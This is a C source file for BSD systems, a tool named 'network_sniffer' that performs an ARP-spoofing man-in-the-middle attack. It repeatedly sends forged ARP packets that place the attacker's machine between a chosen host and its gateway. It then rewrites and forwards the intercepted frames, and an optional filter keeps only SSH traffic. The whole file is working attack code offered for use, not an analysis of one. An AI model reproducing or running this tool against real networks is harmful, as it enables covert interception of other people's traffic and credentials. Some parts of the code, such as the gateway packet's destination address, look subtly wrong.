#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <err.h>

#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>

#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <netdb.h>

#include <errno.h>

#include <sys/ioctl.h>
#include <net/bpf.h>

#include <net/ethernet.h>

#include <libutil.h>
#include <netinet/ip.h>
#include <net/if_arp.h>
#include <pthread.h>

#include <sys/sysctl.h>
#include <net/if_var.h>
#include <net/if_dl.h>

#define MAXIFACELEN	10
#define MACADDRLEN	6
#define IP4_ADDR_LEN	4

#define C_Reset      0
#define C_Bold       1
#define C_Under      2
#define C_Invers     3
#define C_Normal     4
#define C_Black      4
#define C_Red        5
#define C_Green      6
#define C_Brown      7
#define C_Blue       8
#define C_Magenta    9
#define C_Cyan       10
#define C_Light      11
#define N_COLORS     C_Light+1

#define KNRM  "\x1B[0m"
#define KRED  "\x1B[31m"
#define KGRN  "\x1B[32m"
#define KYEL  "\x1B[33m"
#define KBLU  "\x1B[34m"
#define KMAG  "\x1B[35m"
#define KCYN  "\x1B[36m"
#define KWHT  "\x1B[37m"

static int tcolor [N_COLORS] = {
    0,  1,  4,  7, 30, 31, 
    32, 33, 34, 35, 36, 37 
};

#define FATAL(a, ...) do { fprintf(stderr, "%s[FATAL] " KNRM a "\n", KRED, ##__VA_ARGS__); exit(1); } while(0)
#define WARNING(a, ...) do { fprintf(stderr, "%s[WARNING] " KNRM a "\n", KYEL, ##__VA_ARGS__); } while(0)
#define NOTICE(a, ...) do { fprintf(stderr, "%s[NOTICE] " KNRM a "\n", KBLU, ##__VA_ARGS__); } while(0)
#ifdef DEBUG
    #define D(a, ...) do { fprintf(stderr, "\033[31%d[NOTICE]\033[31%d " a "\n", tcolor[C_Blue], tcolor[C_Reset], ##__VA_ARGS__); } while(0)
#else
    #define D(a, ...)
#endif

struct arp_hdr 
{
	unsigned short int hardware;
	unsigned short int protocol;
	u_char hw_addr_len;  
	u_char proto_addr_len;
	unsigned short operation;
	u_char src_addr[6];
	u_char src_ip[4];
	u_char dst_addr[6];
	u_char dst_ip[4];
};

typedef struct descriptor {
	int fd;
	struct in_addr gate_ipaddr;
	struct in_addr host_ipaddr;
	u_char host_hwaddr[MACADDRLEN];
	u_char gate_hwaddr[MACADDRLEN];
	u_char my_hwaddr[MACADDRLEN];
} descriptor_t;

int open_dev(void);
int check_dlt(int fd);
int set_options(int fd, char *iface);
int set_filter(int fd);
void *read_packets(const descriptor_t *fd);
void *send_arp_packets(const descriptor_t *fd);
int get_my_macaddr(char *ifname, u_char *mac_addr);
int string_to_mac(char *string, u_char *mac_addr);
int compare_string_bits(const u_char *first, const u_char *second, int len);
int copy_hwaddr(u_char *source, u_char * dest);
int check_ip_to(void *date, int data_len, const struct in_addr *ipaddr);

void
usage() {
    NOTICE("Usage: network_sniffer [-i interface] [-g gate_ip] [-G gate_macaddr] [-H host_ip] [-M host_macaddr] [-h]");
    exit(0);
}

int
main(int argc, char *argv[])
{
    int bflag, ch;
    char iface[MAXIFACELEN];
    descriptor_t fd;
    pthread_t thread1, thread2;

    bflag = 0;
    while ((ch = getopt(argc, argv, "hi:g:G:H:M:")) != -1) {
	 switch (ch) {
	    case 'i': strncpy(iface, optarg, strlen(optarg));
		 break;
	    case 'g': if (!inet_aton(optarg, &fd.gate_ipaddr)) FATAL("Gate's ip address (ipv4) isn't valid: %s", optarg);
		 break;
	    case 'G': if (!string_to_mac(optarg, fd.gate_hwaddr)) FATAL("Gate's MAC address isn't valid: %s", optarg);
		 break;
	    case 'H': if (!inet_aton(optarg, &fd.host_ipaddr)) FATAL("Host's ip address (ipv4) isn't valid: %s", optarg);
		 break;
	    case 'M': if (!string_to_mac(optarg, fd.host_hwaddr)) FATAL("Host's MAC address isn't valid: %s", optarg);
		 break;
	    case 'h': usage();
		 break;
	    default:
		usage();
	 }
    }
    argc -= optind;
    argv += optind;

    //if (strlen(iface)<1 || fd.gate_ipaddr.s_addr[1]==0 || fd.host_ipaddr.s_addr[1]==0 || !fd.host_hwaddr[5] || fd.gate_hwaddr[5])
//	usage();

    if (get_my_macaddr(iface, fd.my_hwaddr))
        FATAL("get my mac address filed");
    fd.fd = open_dev();
    if (fd.fd < 0)
        FATAL("open_dev: %s", strerror(errno));

    if (set_options(fd.fd, iface) < 0)
        FATAL("set_options: %s", strerror(errno));

    check_dlt(fd.fd);
#ifdef FILTER_SUPPORT    
    if (set_filter(fd.fd) < 0)
        FATAL("set_filter: %s", strerror(errno));
#endif	

    if (pthread_create(&thread1, NULL, (void *)read_packets, &fd))
	FATAL("Worker thread create error: %s", strerror(errno));
    if (pthread_create(&thread2, NULL, (void *)send_arp_packets, &fd))
	FATAL("ARP changer thread create error: %s", strerror(errno));
    if (pthread_join(thread1, NULL))
	FATAL("Worker thread joining error: %s", strerror(errno));    
    if (pthread_join(thread2, NULL))
	FATAL("ARP changer thread joining error: %s", strerror(errno));    

    NOTICE("Exitting...");
}


int
open_dev()
{
    int fd = -1;
    char dev[MAXIFACELEN];
    int i = 0;

    /* Open the bpf device */
    for (i = 0; i < 255; i++) {
        (void)snprintf(dev, sizeof(dev), "/dev/bpf%u", i);

	D("Trying to open: %s\n", dev);

	fd = open(dev, O_RDWR);
	if (fd > -1)
	    return fd;

	switch (errno) {
	    case EBUSY:
		break;
	    default:
		return -1;
	}
    }
    errno = ENOENT;
    return -1;
}

int
check_dlt(int fd)
{
    u_int32_t dlt = 0;

    /* Ensure we are dumping the datalink we expect */
    if(ioctl(fd, BIOCGDLT, &dlt) < 0)
        return -1;

    D("datalink type=%u\n", dlt);

    switch (dlt) {
        case DLT_EN10MB:
            return 0;
        default:
            FATAL("Unsupported datalink type:%u", dlt);
    }
}

int
set_options(int fd, char *iface)
{
    struct ifreq ifr;
    u_int32_t enable = 1;

    /* Associate the bpf device with an interface */
    (void)strlcpy(ifr.ifr_name, iface, sizeof(ifr.ifr_name)-1);

    if(ioctl(fd, BIOCSETIF, &ifr) < 0)
        return -1;

    /* Set header complete mode */
    if(ioctl(fd, BIOCSHDRCMPLT, &enable) < 0)
        return -1;

    /* Monitor packets sent from our interface */
    if(ioctl(fd, BIOCSSEESENT, &enable) < 0)
        return -1;

    /* Return immediately when a packet received */
    if(ioctl(fd, BIOCIMMEDIATE, &enable) < 0)
        return -1;

    return 0;
}

    int
set_filter(int fd)
{
    struct bpf_program fcode = {0};

    /* dump ssh packets only */
    struct bpf_insn insns[] = {
        BPF_STMT(BPF_LD+BPF_H+BPF_ABS, 12),
        BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, ETHERTYPE_IP, 0, 10),
        BPF_STMT(BPF_LD+BPF_B+BPF_ABS, 23),
        BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, IPPROTO_TCP, 0, 8),
        BPF_STMT(BPF_LD+BPF_H+BPF_ABS, 20),
        BPF_JUMP(BPF_JMP+BPF_JSET+BPF_K, 0x1fff, 6, 0),
        BPF_STMT(BPF_LDX+BPF_B+BPF_MSH, 14),
        BPF_STMT(BPF_LD+BPF_H+BPF_IND, 14),
        BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, 22, 2, 0),
        BPF_STMT(BPF_LD+BPF_H+BPF_IND, 16),
        BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, 22, 0, 1),
        BPF_STMT(BPF_RET+BPF_K, (u_int)-1),
        BPF_STMT(BPF_RET+BPF_K, 0),
    };

    /* Set the filter */
    fcode.bf_len = sizeof(insns) / sizeof(struct bpf_insn);
    fcode.bf_insns = &insns[0];

    if(ioctl(fd, BIOCSETF, &fcode) < 0)
        return -1;

    return 0;
}

void *
read_packets(const descriptor_t *fd)
{
    char *buf = NULL;
    char *p = NULL;
    size_t blen = 0;
    ssize_t n = 0;
    struct bpf_hdr *bh = NULL;
    struct ether_header *eh = NULL;
    unsigned long long numofpack = 0;
    uint32_t proto;
    struct protoent *protoEnt;

    if(ioctl(fd->fd, BIOCGBLEN, &blen) < 0)
        return NULL;

    if ( (buf = malloc(blen)) == NULL)
        return NULL;

    D("reading packets ...\n");

    for ( ; ; ) {
        (void)memset(buf, '\0', blen);

        n = read(fd->fd, buf, blen);

        if (n <= 0)
            return NULL;

        p = buf;

        while (p < buf + n) {
            bh = (struct bpf_hdr *)p;
            /* Start of ethernet frame */
            eh = (struct ether_header *)(p + bh->bh_hdrlen);

	    if (eh->ether_type==8) {

		if (!compare_string_bits(eh->ether_shost,fd->host_hwaddr, IP4_ADDR_LEN)) {// && check_ip_to(p+bh->bh_hdrlen, bh->bh_caplen, &fd->gate_ipaddr)) {
			struct ip *ip_hdr = NULL;
			ip_hdr = (struct ip *)(p+bh->bh_hdrlen + sizeof(struct ether_header));   
			protoEnt = getprotobynumber(ip_hdr->ip_p);
			NOTICE("\t[>]\tSend to gate from host... %s", protoEnt->p_name);
			if (copy_hwaddr(fd->my_hwaddr, eh->ether_shost)!=MACADDRLEN || (proto = copy_hwaddr(fd->gate_hwaddr, eh->ether_dhost)!=MACADDRLEN)>0)
				WARNING("Error copy frame from...");
			int bytes_sent = write(fd->fd, p+bh->bh_hdrlen, bh->bh_caplen);
		} 
		if (!compare_string_bits(eh->ether_shost, fd->gate_hwaddr, IP4_ADDR_LEN) && (proto = check_ip_to(p+bh->bh_hdrlen, bh->bh_caplen, &fd->host_ipaddr)!=0)) {
			protoEnt = getprotobynumber(proto);
			NOTICE("\t[<]\tSend to host from gate... %s", protoEnt->p_name);
			if (copy_hwaddr(fd->my_hwaddr, eh->ether_shost)!=MACADDRLEN || copy_hwaddr(fd->host_hwaddr, eh->ether_dhost)!=MACADDRLEN)
				WARNING("Error copy frame from...");
			int bytes_sent = write(fd->fd, p+bh->bh_hdrlen, bh->bh_caplen);
		}
	    }
            p += BPF_WORDALIGN(bh->bh_hdrlen + bh->bh_caplen);
	    numofpack++;
        }
    }
}

void *send_arp_packets(const descriptor_t *fd) {
	unsigned int buffer_size = sizeof(struct arp_hdr) + sizeof(struct ether_header);
	unsigned char host_buffer[buffer_size];
	unsigned char gate_buffer[buffer_size];
	struct bpf_hdr bpf_buf[buffer_size];

	memset(host_buffer,0,buffer_size);
	memset(gate_buffer,0,buffer_size);

	struct ether_header *host_eth = (struct ether_header *)host_buffer;
	struct ether_header *gate_eth = (struct ether_header *)gate_buffer;
	struct arp_hdr *host_arp = (struct arp_hdr *)(host_buffer + sizeof(struct ether_header));
	struct arp_hdr *gate_arp = (struct arp_hdr *)(gate_buffer + sizeof(struct ether_header));

	/* Ezernet header */
	/* for host */
	memcpy(host_eth->ether_dhost, fd->host_hwaddr, ETHER_ADDR_LEN);
	memcpy(host_eth->ether_shost, fd->my_hwaddr, ETHER_ADDR_LEN);
	/* for gate */
	memcpy(gate_eth->ether_dhost, fd->gate_hwaddr, ETHER_ADDR_LEN);
	memcpy(gate_eth->ether_shost, fd->my_hwaddr, ETHER_ADDR_LEN);
	gate_eth->ether_type = host_eth->ether_type = htons(ETHERTYPE_ARP);

	/* ARP header */
	gate_arp->hardware = host_arp->hardware = htons(ARPHRD_ETHER);
	gate_arp->protocol = host_arp->protocol = htons(ETHERTYPE_IP);
	gate_arp->hw_addr_len = host_arp->hw_addr_len = ETHER_ADDR_LEN;   
	gate_arp->proto_addr_len  = host_arp->proto_addr_len = IP4_ADDR_LEN;
	gate_arp->operation = host_arp->operation = htons(ARPOP_REQUEST);
	/* for host */
	memcpy(host_arp->src_addr, fd->my_hwaddr, ETHER_ADDR_LEN);
	memcpy(host_arp->src_ip, &fd->gate_ipaddr.s_addr, IP4_ADDR_LEN);
	memcpy(host_arp->dst_addr, fd->host_hwaddr, ETHER_ADDR_LEN);
	memcpy(host_arp->dst_ip, &fd->host_ipaddr.s_addr, IP4_ADDR_LEN);
	/* for gate */
	memcpy(gate_arp->src_addr, fd->my_hwaddr, ETHER_ADDR_LEN);
	memcpy(gate_arp->src_ip, &fd->host_ipaddr.s_addr, IP4_ADDR_LEN);
	memcpy(gate_arp->dst_addr, fd->host_hwaddr, ETHER_ADDR_LEN);
	memcpy(gate_arp->dst_ip, &fd->gate_ipaddr.s_addr, IP4_ADDR_LEN);

	while (1) {
		int host_bytes_sent = write(fd->fd, host_buffer, buffer_size);
		if(host_bytes_sent > 0) {
			D("ARP PROTO (host): Sent %d bytes\n", host_bytes_sent);
		} else {
			FATAL("ARP PROTO (host): Whoops! Does the device actually have an IP address?");
		}
		int gate_bytes_sent = write(fd->fd, gate_buffer, buffer_size);
		if(gate_bytes_sent > 0) {
			D("ARP PROTO (gate): Sent %d bytes\n", gate_bytes_sent);
		} else {
			FATAL("ARP PROTO (gate): Whoops! Does the device actually have an IP address?");
		}
		usleep(200000);

	}
}

int
get_my_macaddr(char *ifname, u_char *mac_addr) {
	int		mib[6], i;
	size_t		len;
	char		*buf;
	unsigned char	*ptr;
	struct if_msghdr    *ifm;
	struct sockaddr_dl	*sdl;

	mib[0] = CTL_NET;
	mib[1] = AF_ROUTE;
	mib[2] = 0;
	mib[3] = AF_LINK;
	mib[4] = NET_RT_IFLIST;
	if ((mib[5] = if_nametoindex((const char *)ifname)) == 0)
		FATAL("if_nametoindex error: %s", ifname);

	if (sysctl(mib, 6, NULL, &len, NULL, 0) < 0)
		FATAL("sysctl 1 error");

	if ((buf = malloc(len)) == NULL)
		FATAL("malloc error");

	if (sysctl(mib, 6, buf, &len, NULL, 0) < 0)
		FATAL("sysctl 2 error");

	ifm = (struct if_msghdr *)buf;
	sdl = (struct sockaddr_dl *)(ifm + 1);
	ptr = (unsigned char *)LLADDR(sdl);
	for (i=0; i<6; i++)
		mac_addr[i] = ptr[i];
	return 0;
}

int 
string_to_mac(char *string, u_char *mac_addr) {
	if (strlen(string) != MACADDRLEN*2+5)
		FATAL("MAC string not expected length (%lu) expected (%d): %s", strlen(string), MACADDRLEN*2+5, string);
	else
	{
		char tmpMac[MACADDRLEN*2+6];
		char *tmpField;
		int fieldNum = 0;

		strcpy(tmpMac, string);
		tmpField = strtok(tmpMac, ":");
		while (tmpField != NULL && fieldNum < 6)
		{
			char *chk;
			unsigned long tmpVal;

			tmpVal = strtoul(tmpField, &chk, 16);
			if (tmpVal > 0xff)
				FATAL("field %d value %0lx out of range\n", fieldNum, tmpVal);

			if (*chk != 0)
				FATAL("Non-digit character %c (%0x) detected in field %d\n", *chk, *chk, fieldNum);

			mac_addr[fieldNum++] = (u_int8_t) tmpVal;
			tmpField = strtok(NULL, ":");
		}

		if (tmpField == NULL && fieldNum != 6)
			FATAL("MAC address not six fields long (%d)", fieldNum);
		int i = 0;
		for (i = 0; i< MACADDRLEN; i++)
			printf("%x:", mac_addr[i]);
		printf("\n");
		return 1;
	}
}

int
copy_hwaddr(u_char *source, u_char * dest) {
	int cnt;
	for (cnt = 0; cnt<MACADDRLEN; cnt++)
		dest[cnt] = source[cnt];
	return cnt;
}

int
compare_string_bits(const u_char *first, const u_char *second, int len) {
	int i, res = 0;
	for (i=0; i<len && first[i] == second[i]; i++)
		res++;
	if (res == len)
		return 0;
	return 1;
}

int
check_ip_to(void *data, int data_len, const struct in_addr *ipaddr) {
    struct ip *ip_hdr = NULL;
    // prepare ip header 
    ip_hdr = (struct ip *)(data + sizeof(struct ether_header));   
    D("\tVersion: %x\n\tIHL: %x (32bit worlds)\n\tTOS: %x\n\tLength: %d\n\tID: %d\n\tOffset: %d\n\tTTL: %d\n\tProto: %d\n\tSHA32: %x\n\tIp addr of reciver: \n\tIp Addr of transmitter\n", ip_hdr->ip_v, ip_hdr->ip_hl, ip_hdr->ip_tos, ip_hdr->ip_len, ip_hdr->ip_id, ip_hdr->ip_off, ip_hdr->ip_ttl, ip_hdr->ip_p, ip_hdr->ip_sum);
    if (ip_hdr->ip_dst.s_addr == ipaddr->s_addr)
	    return ip_hdr->ip_p;
    return -1;
}
